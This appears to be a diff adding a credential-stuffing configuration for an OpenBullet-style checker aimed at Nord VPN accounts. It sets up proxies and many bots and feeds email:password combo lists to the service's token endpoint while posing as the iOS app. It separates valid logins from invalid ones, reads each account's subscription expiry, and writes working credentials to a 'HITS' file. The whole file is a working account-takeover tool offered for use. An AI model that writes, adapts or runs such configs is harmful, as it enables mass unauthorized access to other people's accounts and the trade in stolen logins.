@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "Name": "Nord VPN",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-03-18T17:52:33.0175233+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" 
+  CONTENT "password=<PASS>&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: NordApp iOS (applestore/5.11.2) iOS/13.5.0" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username" 
+    KEY "Invalid password" 
+    KEY "Unauthorized" 
+  KEYCHAIN Success AND 
+    KEY "token" 
+    KEY "user_id" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "0" 
+
+FUNCTION Base64Encode "token:<0>" -> VAR "1" 
+
+REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" 
+  
+  HEADER "User-Agent: NordApp iOS (applestore/5.11.2) iOS/13.5.0" 
+  HEADER "Authorization: Basic <1>" 
+
+PARSE "<SOURCE>" JSON "expires_at" CreateEmpty=FALSE -> CAP "Expire" 
+
+FUNCTION DateToUnixTime "yyyy-MM-dd HH:mm:ss" "<Expire>" -> VAR "3" 
+
+FUNCTION CurrentUnixTime -> VAR "2" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<2>" GreaterThan "<3>" 
+
+UTILITY File "Nord VPN HITS.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nExpire Date : <Expire>\\n" 
+
